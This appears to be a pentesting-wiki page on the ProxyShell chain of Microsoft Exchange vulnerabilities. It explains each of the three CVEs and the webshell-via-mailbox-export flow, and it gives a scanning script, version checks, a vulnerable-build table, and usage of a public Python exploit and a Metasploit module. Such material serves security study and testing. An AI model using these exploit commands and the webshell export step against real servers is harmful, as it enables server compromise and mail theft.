---
description: Chained CVE-2021-34473, CVE-2021-34523, CVE-2021-31207
---

# ProxyShell

## Theory

On BlackHat USA 2021, Orange Tsai (a 0-day researcher focusing on web/application security) revealed the three CVEs affecting Microsoft Exchange that chained together can result in arbitrary code execution on the server. They dubbed these vulnerabilities ProxyShell.&#x20;

**CVE-2021-34473**: Path confusion bug on the Microsoft Exchange Explicit Logon feature.\
Explicit Logon feature is a legitimate feature that enables users to open a new browser window of mailbox/calendar only under these conditions:

* The user’s permissions are required to be _‘Full Access’_.
* The mailbox or calendar is configured to publish.

When opening the new window, the Exchange Backend server reads the URI and parses it for receiving the mailbox address. It looks like:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In order to exploit this vulnerability, the attacker just needs to replace the mailbox address with the following string: /autodiscover/autodiscover.json:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

When the Exchange Backend server reads this string, it does not perform the checks on the address like usual, the string leads the server to access all backend URLs with the NT AUTHORITY/SYSTEM permissions.

**CVE-2021-34523** Downgrade Privilege on Exchange in order to access the PowerShell backend.\
After achieving access to all Exchange Backend server URLs with the NT AUTHORITY/SYSTEM, we can use the Microsoft Exchange built-in feature called **PowerShell Remoting.** It aime to assist with administrative activities.\
However, the NT AUTHORITY/SYSTEM user **does not have a mailbox** and can not access the PowerShell command line interface, so the attacker needs to change his privilege level.

When the PowerShell backend receives requests it checks the _**X-CommonAccessToken**_. If the header does not exist, it uses another method that checks the CommonAccessToken in the **X-Rps-CAT** parameter. So, the attacker just needs to pass the X-Rps-CAT with the information he collected from the victim mailbox or from the default information from built-in mailboxes (to which he has access).This is how the attacker can downgrade his NT AUTHORITY/SYSTEM privileges to Exchange Admin.

\
**CVE-2021-31207:** Export user’s mailbox to receive Remote Code Execution\
At this point when the attacker has access to the PowerShell with the Exchange Admin, he just needs to make sure that the required _‘Import Export Mailbox’_ role is set to the impersonated user.\
If the role is not set, the attacker will need to execute the _New-ManagementRoleAssignment_ cmdlet.

```powershell
New-MailboxExportRequest -Mailbox user@domain.local -FilePath \\127.0.0.1\C$\path\to\shell.aspx
```

**The full attack flow look as follow:**

In order to create a WebShell on the Microsoft Exchange server when exporting the user’s mailbox, the attacker needs to deliver the payload via SMTP. However, when the payload arrives, it is encoded.&#x20;

So when sending the payload, the attacker needs to write the decoder in it and decode it.&#x20;

1. Send an email with the encoded WebShell payload via SMTP.
2. Launch PowerShell with a privileged PowerShell admin user.
   * Path confusion to receive the NT AUTHORITY/SYSTEM privileges and access all Exchange Backend server URLs (CVE-2021-34473).
   * Set the X-Rps-CAT parameter with the Exchange admin access token (CVE-2021-34523).
3. Execute commands inside the PowerShell session (CVE-2021-31207).
   * New-ManagementRoleAssignment to set the ‘Import Export Mailbox’ role to the impersonated user.
   * New-MailboxExportRequest to export the user’s mailbox to a specific desired path.

4\. Execute commands on the shell.

## Practice

{% tabs %}
{% tab title="Enumerate" %}
We can use the [http-vuln-exchange-proxychain.nse](https://github.com/GossiTheDog/scanning/blob/main/http-vuln-exchange-proxyshell.nse) nmap script to scan a target

```bash
nmap -p80,443 --script="http-vuln-exchange-proxyshell.nse" $IP

443/tcp open  https
    |_http-vuln-exchange-proxyshell:  ** Vulnerable to ProxyShell SSRPF **
```

If we have local access to the target running exchange, we can check it version using the following powershell command:

```powershell
#Method 1
PS> GCM exsetup |%{$_.Fileversioninfo}

#Method 2
PS> (Get-Command ExSetup.exe).FileVersionInfo.ProductVersion

ProductVersion   FileVersion      FileName                                                                             
--------------   -----------      --------                                                                             
15.02.0858.005   15.02.0858.005   C:\Program Files\Microsoft\Exchange Server\V15\bin\ExSetup.exe
```

We can now search for the exact Microsoft Exchange product version using [this microsoft link](https://learn.microsoft.com/fr-fr/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019).\
\
Following versions are vulnerable :&#x20;

<table><thead><tr><th width="359">Version</th><th>Vulnerable ProductVersion</th></tr></thead><tbody><tr><td>Exchange 2013 CU23</td><td>&#x3C; 15.0.1497.15</td></tr><tr><td>Exchange 2016 CU19</td><td>&#x3C; 15.1.2176.12</td></tr><tr><td>Exchange 2016 CU20</td><td>&#x3C; 15.1.2242.5</td></tr><tr><td>Exchange 2019 CU8 </td><td>&#x3C; 15.2.792.13</td></tr><tr><td>Exchange 2019 CU9</td><td>&#x3C; 15.2.858.9</td></tr></tbody></table>

{% hint style="info" %}
All versions before May 11, 2021 are vulnerable
{% endhint %}
{% endtab %}

{% tab title="Exploit" %}
We can use [horizon3ai's python script](https://github.com/horizon3ai/proxyshell) to exploit this vulnerability

```bash
#Auto discover emails
python3 exchange_proxyshell.py -u https://<EXCHANGE-IP>

#Providing an email
python3 exchange_proxyshell.py -u https://<EXCHANGE-IP> -u user@domain.local
```
{% endtab %}

{% tab title="Exploit - Metasploit" %}
A Metasploit module is available to exploit ProxyShell

```bash
msf > use exploit/windows/http/exchange_proxyshell_rce
msf exploit(exchange_proxyshell_rce) > show targets
    ...targets...
msf exploit(exchange_proxyshell_rce) > set TARGET < target-id >
msf exploit(exchange_proxyshell_rce) > show options
    ...show and set options...
msf exploit(exchange_proxyshell_rce) > exploit
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://www.rezilion.com/blog/proxyshell-or-proxynotshell-lets-set-the-record-straight/" %}

